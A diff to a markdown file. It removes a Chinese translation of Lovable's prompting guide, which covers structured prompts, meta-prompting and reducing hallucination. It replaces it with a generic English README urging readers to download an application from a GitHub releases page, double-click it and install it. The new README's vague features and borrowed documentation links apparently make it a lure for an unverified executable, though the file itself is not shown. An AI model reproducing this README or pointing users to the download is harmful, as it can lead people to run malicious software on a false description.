@@ -1,367 +1,66 @@
-# Prompting 1.1
+# 🎉 lovable-prompting - Simple Prompts for Your Needs
 
-提示结构、提示层级、元/反向元提示，以及含示例的基础策略。
+## 📥 Download Now
+[![Download lovable-prompting](https://img.shields.io/badge/Download%20lovable--prompting-v1.0-blue)](https://github.com/zoar-ui/lovable-prompting/releases)
 
-> 原文出处：<https://docs.lovable.dev/prompting/prompting-one>
+## 📖 Introduction
+Welcome to lovable-prompting! This application helps you generate simple and effective prompts for various tasks. Whether you need inspiration for writing, brainstorming, or daily activities, lovable-prompting makes it easy.
 
-> **提醒**
-> 为了帮助你充分利用 Lovable，我们整理了一份提示策略和方法清单。其中一部分来自团队经验，另一部分来自社区分享。因为 Lovable 依赖大型语言模型（LLM），有效的提示策略能显著提升效率和准确度。
+## 🚀 Getting Started
+Follow these steps to get started quickly:
 
-## 什么是 Prompting？
+1. Click the download button above or visit the [Releases Page](https://github.com/zoar-ui/lovable-prompting/releases) to find the latest version.
+2. Look for the most recent release.
+3. Download the application file.
 
-“Prompting” 指的是你给 AI 系统的文本指令，用来执行任务。在 Lovable（一个由 AI 驱动的应用构建器）中，提示就是你“告诉” AI 要做什么——从创建 UI 到编写后端逻辑。Lovable 使用 LLM，因此清晰、精心设计的提示能大幅提升 AI 构建应用的效率和准确性。简而言之，提示越好，结果越佳。
+## 📥 Download & Install
+To download lovable-prompting, visit the [Releases Page](https://github.com/zoar-ui/lovable-prompting/releases).
 
-## Prompting 为什么重要？
+1. Click on the version you would like to download.
+2. Choose the file suitable for your operating system. Common options include Windows, macOS, and Linux.
+3. Once the file has downloaded, locate it in your Downloads folder.
 
-大多数人以为提示就是随便敲一句话交给 AI，然后听天由命——事实并非如此。AI 能否给出糟糕或出色的回答，关键都在于你如何提示。无论你是否是开发者，只要学会在 Lovable 中掌握提示工程，就能：
+### 💻 System Requirements
+Before installation, please ensure your system meets the following requirements:
 
-- 通过精准指令让 AI 自动化重复任务。
-- 借助 AI 生成的洞察和方案更快调试。
-- 轻松构建并优化工作流，在正确引导下把繁重工作交给 AI。
+- **Operating Systems:** Compatible with Windows 10 and later, macOS 10.14 and later, and most Linux distributions.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB of free disk space.
+- **Network:** Internet connection is recommended for updates.
 
-最棒的是，你不需要成为资深工程师。掌握合适的提示技巧，就能避免反复试错，充分释放 Lovable 中 AI 的潜力。本手册将从基础概念出发，逐步带你进入高级提示策略，让你能高效与 AI 沟通，快速构建。
+## 🛠️ Installation Steps
+1. Find the downloaded file in your folder.
+2. Double-click on the file to begin installation.
+3. Follow the on-screen instructions to complete the setup.
+4. Once the installation is finished, you will see the lovable-prompting icon on your desktop.
 
-## 理解 AI 的“思考方式”
+## 🎮 Using lovable-prompting
+After installation, you can start the application:
 
-与传统编码不同，与 AI 协作的核心在于清楚表达意图。驱动 Lovable 的 LLM 并不像人类那样“理解”，它是根据训练数据中的模式预测输出。这意味着在提示时要注意：
+1. Open lovable-prompting by double-clicking the icon on your desktop.
+2. A user-friendly interface will greet you.
+3. Input your requirements or areas where you need prompts.
+4. Click the "Generate" button to receive your prompts instantly.
 
-- **给出充分的上下文与细节**：模型没有常识，也不会凭空了解背景。始终提供相关信息或需求。例如，与其只说“构建一个登录页”，不如说明“用 React 创建一个带邮箱/密码认证并处理 JWT 的登录页”，并明确技术栈（如 “使用 Supabase 作为认证”）。
-- **明确指令与约束**：不要指望 AI 自行推断目标。若有特定限制或偏好，要直接说明。例如要求使用某个库、限制修改范围等。AI 会按字面执行，模糊的表达可能导致错误或“幻觉”（凭空编造信息）。
-- **结构有序（强调顺序与重点）**：Transformer 模型对提示开头与结尾尤为敏感。把最重要的信息放在开头，必要时在结尾重申关键要求。注意上下文窗口有限，提示或对话过长可能导致模型遗忘早先细节。保持提示聚焦，必要时在长会话中提醒要点。
-- **了解模型边界**：AI 的知识来自训练数据，不会知道最新事件或你未提供的私有信息。即使不确定，它也可能自信回答。需要事实或数据时，务必提供引用文本或做好验证。
+## 🌟 Features
+- **User-Friendly Interface:** Designed for ease of use with no technical knowledge required.
+- **Prompt Generator:** Quickly create prompts tailored to your needs.
+- **Customization:** Adjust settings to receive personalized prompt results.
+- **Save Your Prompts:** Keep your favorite prompts for future use.
 
-把提示想象成你在向一个“非常字面理解的实习生”交代任务。指导越清晰、结构越完整，结果就越好。接下来我们会介绍让提示奏效的核心原则。
+## ❓ Frequently Asked Questions
 
-## 核心提示原则：CLEAR 框架
+### How do I fix problems during installation?
+If you encounter issues during installation, check your system requirements. Ensure you have enough disk space and that you are using a compatible operating system. Try restarting your computer and attempt the installation again.
 
-优秀的提示遵循简单的原则，可用 CLEAR（Concise、Logical、Explicit、Adaptive、Reflective）来记忆：
+### Can I uninstall lovable-prompting?
+Yes. To uninstall, go to your system's settings, find 'Apps' or 'Programs,' locate lovable-prompting in the list, and choose to uninstall it.
 
-- **Concise（简洁）**：清楚直接地表达。多余或含糊的语言会让模型困惑。使用明确语句。例如：**BAD**：“你能不能写点关于科学的东西？”；**GOOD**：“请写一篇 200 字的文章，概述气候变迁对沿海城市的影响。”减少无用信息，精准描述需求。
-- **Logical（逻辑）**：以条理分明的方式组织提示。把复杂请求拆成步骤或要点，便于 AI 依序处理。**BAD**：“帮我做一个用户注册功能，还要展示使用统计。”；**GOOD**：“1. 用 Supabase 实作用邮箱与密码的用户注册表单。2. 注册成功后展示用户数量统计的仪表板。”有逻辑的流程能确保模型系统性回应。
-- **Explicit（明确）**：具体说明想要与不想要的内容。如有格式或风格要求，尽量给出示例。**BAD**：“告诉我关于狗的事。”（过于宽泛）；**GOOD**：“请用项目符号列出 5 条关于黄金猎犬的冷知识。”假定模型什么都不懂，重要信息都要写明。
-- **Adaptive（自适应）**：输出不理想时要迭代提示。Lovable（和其他 LLM）支持对话式交互，可通过补充说明或指出问题来引导模型。例如：“你给的方案缺少认证步骤，请补上用户认证的代码。”甚至可以请 AI 帮你改写提示（即元提示，后文详述）。
-- **Reflective（反思）**：在每次与 AI 互动后，检视哪些提示奏效、哪些导致误解。这是提示工程师自身的学习过程。复杂任务结束后，可请 AI 总结方案或思路（稍后将谈到反向元提示）。持续反思有助于不断优化提示。
+## 📞 Support
+For further assistance, please visit our [Help Center](https://docs.lovable.dev/prompting/prompting-one) or reach out through our support channels. We are here to help you with any inquiries or issues.
 
-牢记 CLEAR 原则，能帮助你在编写提示时保持高质量。下一节我们会说明从基础到进阶的具体技巧，包括如何设计提示结构，并把 AI 当作合作伙伴。
+## 🔗 Links
+- [Releases Page](https://github.com/zoar-ui/lovable-prompting/releases)
+- [Documentation](https://docs.lovable.dev/prompting/prompting-one) 
 
-## 提示的四个层级
-
-随着练习增多，你的提示技巧会不断精进。下面按照掌握程度划分出四个层级，从结构化的“辅助轮”到高级的元提示技巧，可视需求搭配使用。
-
-### 1. 结构化“辅助轮”提示（显式格式）
-
-刚入门或面对复杂任务时，为提示加上标签式结构能避免遗漏重点。Lovable 常用的格式是：
-
-- **Context（背景）**：设定 AI 的角色或背景（例：“你是一位世界级 Lovable AI 编码助手”）。
-- **Task（任务）**：明确目标（例：“构建一个具有用户登录与实时同步的全栈待办应用”）。
-- **Guidelines（指引）**：偏好的方法或风格（例：“前端用 React，样式用 Tailwind，认证与数据库用 Supabase”）。
-- **Constraints（约束）**：硬性限制或禁止事项（例：“不要使用付费 API；应用需兼容桌面与移动端”）。
-
-清楚标记每个部分能减少误解。例如：
-
-```
-Context: 你是一位 Lovable 的全栈开发专家。
-Task: 使用 Supabase（邮箱/密码认证）创建一个安全的 React 登录页。
-Guidelines: UI 要极简，遵循 Tailwind CSS 规范，并为每一步提供清晰的代码注释。
-Constraints: 只能修改 LoginPage 组件；不要改动其他页面；确保最终输出可以在 Lovable 编辑器中运行。
-```
-
-这种详细程度能逐步引导 AI。对新手或多步骤复杂任务来说，“辅助轮”式提示能迫使你彻底思考需求，也方便模型理解。
-
-### 2. 会话式提示（无需辅助轮）
-
-熟练之后，未必需要如此严苛的结构。会话式提示更像与你的同事交流：语言更自然但仍保持清晰完整。例如：
-
-> 我们来做一个上传头像的功能。需要包含带图片文件输入框的表单和提交按钮。提交后要把图片存到 Supabase Storage，并更新用户资料。请写出对应的 React 组件和所需的后端函数，并妥善处理错误（例如文件过大）。
-
-这是更自由的表达，但仍按逻辑说明需求。会话式提示适合在已有上下文的持续对话中使用，或是处理较小的任务。即使采用会话风格，也可以用段落或项目符号来分隔重点，以保持清晰度。
-
-### 3. 元提示（AI 协助改进提示）
-
-元提示是指直接请 AI 帮你改写或优化提示，尤其在输出偏离预期时。这说明原提示可能不够清楚。例如：
-
-- “请审查我上一个提示，指出其中的模糊之处或缺少的信息，并建议更简洁明确的写法。”
-- “把这句提示改写得更具体详细：‘使用 Supabase 在 React 中创建安全的登录页，并确保基于角色的认证。’”
-
-AI 会给出更结构化或补充细节的版本，帮助你发现疏漏。在 Lovable 中，可以在 Chat 模式安全地进行这类操作（不会直接修改项目）。元提示能把 AI 当作提示编辑器，快速提升你的提示工程能力。
-
-### 4. 反向元提示（让 AI 变成文档工具）
-
-反向元提示是指在完成任务后，请 AI 总结过程或生成可复用的提示模板，方便日后参考。例如在 Lovable 中排查完 JWT 认证问题后，可以这样提示：
-
-> 请总结我们在配置 JWT 认证时遇到的错误及解决方式，并撰写一个未来可以避免这些错误的提示模板。
-
-AI 会给出简明扼要的复盘，并附上类似“Context: … Task: …”的模板。这样你就能累积一套可复用的提示与经验。下次遇到类似任务，只需套用这些模板或清单即可。
-
-## 高级提示技巧
-
-当你掌握基础后，可以进一步利用以下策略，使 Lovable 中的 AI 输出更可靠、更符合需求。
-
-### 零样本（Zero-Shot）与少样本（Few-Shot）提示
-
-- **零样本提示**：不给示例，直接描述任务，依赖模型的通用能力。适用于常见或描述明确的任务，例如：“请把‘I am learning to code.’ 翻译成西班牙语。”
-- **少样本提示**：在提示中提供几个示例，教模型你想要的格式或风格。这对特殊格式或罕见任务特别有效。例如：
-
-```
-请纠正以下句子的语法：
-输入：“the code not working good” → 输出：“The code is not working well.”
-输入：“API give error in login” → 输出：“The API gives an error during login.”
-现在输入：“user not found in database” → 输出：
-```
-
-给出样例能让 AI 按相同模式继续。少样本提示适用于 Lovable 中需要特定风格的产出（例如特定格式的代码注释或提交信息）。虽然会占用更多 tokens，但往往换来更稳定的结果。
-
-**使用建议**：先尝试零样本。如果结果不符合预期，就添加示例转向少样本。比如你想要的函数风格不对，可以提供一个示例函数，再让 AI 仿照。少样本特别适合复杂输出，如生成测试案例：先给出一个样例测试，再请 AI 写更多。
-
-### 控制幻觉并确保准确性
-
-AI 的“幻觉”指它自信地捏造不存在的信息或代码。在 Lovable 这样的代码平台中，幻觉可能表现为调用不存在的函数、使用错误的 API 或编造摘要细节。完全避免很难，但可以通过提示降低风险：
-
-- **提供可靠的上下文数据**：上下文越充分，AI 猜测的空间就越小。善用项目的 Knowledge Base，把 PRD、用户流程、技术栈等都放进去，确保 AI 依据真实资料回答。
-- **在提示中附上参考资料**：遇到事实性问题或涉及外部系统的代码时，附上相关文档或数据片段。例如：“根据以下 API 返回格式解析用户对象……（附上 JSON 示例）”。
-- **要求分步推理**：怀疑 AI 可能随意猜测时，可以要求它先解释思路或验证。例如：“在给出最终代码前，请先说明解决方案步骤，如有不确定之处请标明。”
-- **指示保持诚实**：在提示中加入类似“如果不确定，请不要编造，可说明需要的信息或提出澄清问题。”虽然不能完全防止错误，但能减少“自信瞎编”。
-- **迭代验证**：拿到输出后，尤其是重要任务，要再走一步验证。可以提示：“请检查上述代码是否完全符合需求，并说明可能不满足的部分。”
-
-总之，及时复核 AI 输出，特别是意外或“看起来太神奇”的部分。善用这些方法能在 Lovable 中保持对项目的掌控。
-
-### 了解并善用模型能力
-
-不同模型、不同模式的行为各异。想获得最佳效果，需要了解 Lovable 中可用的工具：
-
-- **Chat 模式 vs 默认模式**：Chat 模式适合头脑风暴、讨论设计或调试，输出不会直接改动项目。默认模式用于执行具体改动，如写代码或创建组件。常见流程是先在 Chat 模式规划，再切换到默认模式落实。
-- **响应长度与上下文**：请求输出很长时（如整份模块代码），可能出现截断或逻辑混乱。此时要拆分任务，例如一次生成一个函数。
-- **格式与编码偏好**：如果希望 AI 遵循特定格式，记得在提示中说明，例如“请用 Markdown 呈现代码”，“遵循项目的 ESLint 规则”。长期使用后，AI 会逐步模仿项目现有风格，但适时提醒能加速对齐。
-
-把 AI 视为强大的工具，但要认识它的优劣势：它擅长处理结构化指令，却容易遗忘上下文、话多或出现幻觉。合理安排提示，就能扬长避短。接下来我们会把这些原则应用到 Lovable 的具体使用情境中。
-
-## Lovable 实战提示技巧
-
-以下技巧结合 Lovable 的平台特性，帮助你获得最佳结果。
-
-### 从坚实的知识库开始
-
-在提示之前，先在 Lovable 项目的 Knowledge Base 中填写 PRD、用户流程、技术栈、UI 规范、后端细节等。这些信息会成为 AI 的长期上下文。例如，若 PRD 明确写着“范围外：社交登录”，AI 就不太会随意新增 Google 登录。
-
-你也可以一开始就提示：“在写代码之前，请先阅读项目的 Knowledge Base，并确认你理解应用的目标与限制。”
-
-### 具体描述，避免模糊
-
-模糊的提示只会换来模糊的结果。始终明确说明你想要的目标和方式。
-
-- **不要这样**：
-  - “让这个应用更好。”
-  - “创建一个用户输入表单。”
-- **应该这样**：
-  - “在不改变 UI 或功能的前提下，重构应用以清理未使用的组件并提升性能。”
-  - “创建一个包含用户名、邮箱和密码字段的用户注册表单，并附上提交按钮。”
-
-### 渐进式提示
-
-避免一次性要求构建庞大的应用。把开发流程拆成步骤，一步步提示。
-
-- **不要这样**：
-  - “构建一个含 Supabase、认证、Google Sheets 导出和数据增强的 CRM 应用。”
-  - “帮我做出一个含认证、商品列表和结账功能的电商应用。”
-- **应该这样**：
-  1. “设置一个连接 Supabase 的 CRM 后端。”
-  2. “很好！请加上带用户角色的安全认证流程。”
-  3. “谢谢！下一步请整合 Google Sheets 以导出记录。”
-
-或：
-
-  1. “建立一个用户资料的数据库 Schema。”
-  2. “请开发一个获取用户数据的 API 端点。”
-
-### 添加约束与必备需求
-
-不要害怕在提示里写明限制条件：
-
-- “创建一个简单的待办应用，同一时间最多显示 3 个任务，支持新增、编辑、删除。”
-- “优化这段代码，但必须保持 UI 与核心功能不变，并记录每处改动。”
-- “最多只能调用 3 次 API，且不要使用额外外部库。”
-- “页面最多展示 3 条任务。”
-
-清晰的限制能避免 AI 过度设计，让它聚焦真正重要的部分。
-
-### 避免词语歧义
-
-如果术语可能有多种解释，就要进一步说明。
-
-- **不要这样**：
-  - “加一个 Profile 功能。”
-  - “支持通知。”
-- **应该这样**：
-  - “新增一个用户 Profile 页面，包含字段 X、Y、Z。”
-  - “在表单提交时发送电子邮件通知。”
-
-### 注意语气与礼貌
-
-虽然不会影响功能，但礼貌的语气有时能让提示更具描述性。例如：“请不要修改首页，只聚焦仪表板组件。”既礼貌又明确指出限制。
-
-### 有策略地使用 Lovable 模式
-
-如前所述，Chat 模式适合规划；默认模式适合执行。例如：
-
-1. 在 Chat 模式中说：“我想为应用新增博客板块，我们讨论一下数据与页面结构吧。”
-2. 达成共识后，切换到默认模式提示：“根据上述计划，创建 BlogPost 页面并建立对应的 Supabase 表。”
-
-### 善用格式结构
-
-当你希望 AI 按顺序输出，可在提示中列出编号或步骤。例如：
-
-```
-我们来思考如何设置安全的认证系统：
-1. 需要哪些组件？
-2. 它们应该如何协作？
-3. 请提供实现代码。
-```
-
-或指定输出顺序：“先解释思路，再给出代码，最后提供一个测试示例。”
-
-### 引用示例或参考资料
-
-若有目标设计或代码风格，直接说明或提供示例。这样 AI 就有明确参考：
-
-- “我们在构建一款帮助团队追踪任务的项目管理工具，具备用户认证、项目创建、任务分配与报表功能。第一步请创建项目创建的 UI。”
-- “我要一个整合 Supabase 的 CRM 应用并含安全认证流程，请先建立后端。”
-- “我们正在开发一个专注环保商品的电商平台，请生成一个带类别与价格过滤的商品列表页面。”
-
-### 使用图像提示
-
-Lovable 支持上传图像辅助提示。可以简单地说：
-
-- “请创建并实现一个尽量贴近附件截图的 UI。”
-- “这张截图显示移动端排版有问题，请调整边距与内边距，让布局响应式且保持设计结构。”
-
-若再补充功能说明，效果会更好。例如：
-
-> “我想要一个尽可能贴近截图的应用。这其实是一个看板工具，需要能在每个栏位新增卡片、调整同栏卡片顺序、并在栏位间拖动卡片。可使用 pangea home dnd npm 套件实现拖拽。”
-
-### 整合反馈
-
-查看 AI 的输出后，提供明确反馈以便微调：
-
-> “登录表单很好，请加上对邮箱格式的验证，确保必须是有效邮箱。”
-
-### 重视可访问性
-
-提示时强调无障碍标准，能确保输出兼顾易用与规范：
-
-> “生成一个符合可访问性最佳实践的 React 登录表单组件，需包含适当的 ARIA 标签与键盘导航支持。”
-
-### 指定组件与库
-
-若想保持项目一致性，可直接指定要使用的 UI 库或组件：
-
-> “请用 shadcn/ui 与 Tailwind CSS 创建一个响应式导航栏。”
-
-### 多语言提示
-
-在多语言环境下，说明希望的代码注释或文档语言：
-
-> “生成一个计算斐波那契数列的 Python 脚本，注释与文档请用法语。”
-
-### 定义项目结构与文件管理
-
-明确说明文件名称与路径，确保代码有序：
-
-> “创建一个名为 `components/user-profile.tsx` 的 React 组件 `UserProfile`，包含头像、用户名与个人简介。”
-
-### 精准指示编辑范围
-
-Lovable 默认可能会改动整份文件。为了避免意外影响，要在提示中明确范围：
-
-> “在 `Header` 组件中，把注册按钮文字改成 ‘Get Started’，并将其移动到导航栏左侧。”
-
-同时补充“不准修改其他组件或逻辑”，能减少连带修改。
-
-### 模拟“文件锁”
-
-若某些文件不能动，可以在每个提示中强调：
-
-> “请不要修改 `authentication.js`。”
-
-或指定只在特定组件内作业：
-
-> “请仅在 `ProfilePage` 组件中进行调整，其他部分维持原样。”
-
-### 设计与 UI 微调
-
-若只想调整视觉效果，一定要说清楚，以免逻辑被改动：
-
-> “把登录按钮改为蓝色并放大 20%，但不要改动任何功能或 `onClick` 逻辑。”
-
-要做响应式调整时，可先要求规划再执行：
-
-> “请优化登录页在移动端的布局。先说明各区块在小屏幕下的排版方式，再使用标准的 Tailwind 断点（sm、md、lg）实施 CSS 调整，不要改动功能。”
-
-### 重构与优化代码
-
-当 Lovable AI 建议重构时，提示要强调行为不变：
-
-> “请在不改变应用行为与输出的前提下，重构代码使结构更清晰高效。”
-
-你也可以先要一个重构计划：
-
-> “请扫描 `utils/` 文件夹，列出可改进的结构或重复代码，但先不要实际改动。”
-
-大型重构要分阶段进行：先重构状态管理，再处理 API 调用，逐步验证。
-
-完成后，可提示：“现在代码已重构，请确认 UI 是否保持一致，关键流程是否仍然通过测试。”
-
-### 借助 AI 调试
-
-遇到错误时，把日志或代码贴给 AI（建议在 Chat 模式），例如：
-
-> “以下是错误信息和相关代码，问题在哪？该如何修复？”
-
-遵循 CLEAR 原则，明确说明预期与实际行为。如果初次修复无效，就提供新的错误或说明问题仍在，并请它尝试其他方法。
-
-对于 UI Bug，可以描述视觉问题或上传截图，例如：“侧边栏在移动端应该隐藏，但仍显示。以下是 CSS……可能的原因是什么？”
-
-修复后务必测试，若成功，可运用反向元提示让 AI 总结根因与避免方式，充实知识库。
-
-### 何时需要 AI、何时不需要
-
-高手知道何时无需提示。若你清楚要做的小改动（如改一行文字或调一个 padding），自己动手可能更快，也能避免 AI 误改其他部分。使用 AI 的时机包括：复杂逻辑、重复样板、需多步操作或你不确定该怎么做。
-
-简易任务可透过：
-
-- 自己编写或快速搜索。
-- 使用开发者工具（如浏览器 DevTools）调试，再手动修改。
-
-当你只需把按钮颜色改一下，自己改 CSS 往往更省时；但要从零实现新功能时，AI 就是得力助手。
-
-记住，Lovable 的 AI 像是一位助理工程师，你负责指派任务并审查成果。只要清楚地交代，就能大幅提升开发速度。
-
-### 在不同工具中的应用
-
-这些提示原则不仅适用于 Lovable，也适用于其他 AI 或自动化工具。
-
-- **Lovable Builder**：在 Lovable 聊天界面使用提示来构建和优化应用。先给出总体项目提示，再按功能迭代。需要讨论或调试时用 Chat 模式。
-- **make.com、n8n（流程自动化）**：虽然不一定用自然语言提示，但规划自动化流程同样需要清晰指令。Lovable 可以帮你生成集成逻辑，例如：“当表单提交时，发送数据到 Make.com webhook，触发 Slack 通知。” 或 “用户注册后，触发 Make.com 工作流在 Salesforce 创建记录。”
-- **边缘案例与外部整合**：Lovable 支持 Stripe、GitHub、Supabase 等服务。提示时把这些整合细节当作上下文或约束的一部分，如：“将表单连接到 Stripe（测试模式），付款成功后导向 `/thank-you`。”
-
-## 总结
-
-强大的提示核心在于清晰、结构与上下文。不论你是让 Lovable 构建功能，还是编排自动化任务，都要清楚描绘期望成果。
-
-- 初学者可从结构化提示起步，熟悉后再切换到更自然的会话风格。
-- 运用元提示技巧不断改善，并从每次互动中学习。
-
-只要持续练习，你就能像与团队成员沟通一样指挥 AI，获得理想输出。
-
-## 结语
-
-现在你已经理解如何编写清晰有效、贴合 Lovable AI 的提示。从 CLEAR 框架到少样本、元提示等进阶策略，这些方法能帮助你精确获取所需输出。只要保持聪明、简洁、直接、灵活的指示，就能像资深工程师一样与 AI 协作。
-
-别忘了维持“反思”的习惯：每次提示/回应都是反馈，可帮助你持续优化。随着你在 Lovable 中不断实践，你会越来越熟悉 AI 需要哪些信息才能产出好结果。将这些技巧与个人创意结合，你几乎无所不能。
-
-专注于自己的宏伟点子吧——只要清楚指示，Lovable 的 AI 会为你搞定执行细节。
-
-祝提示顺利，也祝构建愉快！
-
-## 免责声明
-
-本文由 Codex 自动化进行翻译，提示词：将原文用中文重写，尊重原意的前提下通俗易懂。
+Enjoy generating your prompts with lovable-prompting!
